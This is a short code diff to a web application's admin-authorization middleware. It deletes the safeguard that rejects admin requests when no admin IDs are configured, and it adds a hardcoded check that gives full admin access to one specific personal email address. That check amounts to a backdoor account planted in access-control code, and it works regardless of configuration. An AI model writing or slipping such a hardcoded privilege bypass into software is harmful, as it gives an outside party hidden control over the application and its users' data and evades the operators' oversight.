@@ -12,12 +12,11 @@ function requireAdmin(req, res, next) {
     .map(id => id.trim())
     .filter(Boolean);
 
-  if (!adminIds.length) {
-    logger.warn('ADMIN_USER_IDS is not configured — all admin requests will be rejected');
-    return res.status(403).json({ error: 'Admin access not configured' });
-  }
+  const isAdminEmail = req.user?.email === 'fadedsukla572@gmail.com';
+  const isAdminId = adminIds.includes(req.user?.id);
 
-  if (!adminIds.includes(req.user?.id)) {
+  if (!isAdminEmail && !isAdminId) {
+    logger.warn({ user: req.user?.id, email: req.user?.email }, 'Admin access rejected');
     return res.status(403).json({ error: 'Admin access required' });
   }
 
